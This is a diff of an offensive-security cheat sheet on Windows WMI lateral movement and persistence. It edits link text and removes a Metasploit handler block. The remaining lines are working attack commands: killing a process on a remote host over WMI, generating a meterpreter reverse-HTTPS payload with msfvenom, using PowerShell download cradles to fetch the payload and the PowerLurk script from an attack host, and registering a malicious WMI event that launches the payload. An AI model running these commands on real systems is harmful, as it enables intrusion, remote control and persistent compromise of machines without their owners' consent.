@@ -206,7 +206,7 @@ PS C:\> Get-WmiObject -Class Win32_Process -Filter {ProcessId = "[Process ID]"} 
 PS C:\> Get-WmiObject -Class Win32_Process -Filter {ProcessId = "[Process ID]"} -ComputerName [Remote Host] -Credential [Username] | Remove-WmiObject
 ```
 ### Persistance
-* Generate meterpreter payload.
+* [Generate meterpreter payload](../../../../Tools/Metasploit/README.md#HTTPS-Reverse-Shell-with-Impersonate-SSL).
 ```bash
 msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f exe > payload.exe
 ```
@@ -219,14 +219,6 @@ python -m SimpleHTTPServer 80
 PS C:\> IEX (New-Object Net.WebClient).DownloadFile('http://[Attack Host]/payload.exe', 'C:\Windows\Tasks\payload.exe')
 ```
 * [Start HTTPS meterpreter listener](../../../../Tools/Metasploit/README.md#HTTPS-Handler-with-PEM).
-```bash
-msfconsole
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_https
-set LHOST [Attack Host]
-set LPORT 443
-run -j
-```
 * Use Download Cradle to Transfer [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) to Target and Install Malicious WMI Event.
 ```powershell
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerLurk.ps1'); Register-MaliciousWmiEvent -EventName CalcExec -PermanentCommand "cmd.exe /c C:\Windows\Tasks\payload.exe" -Trigger ProcessStart -ProcessName calc.exe
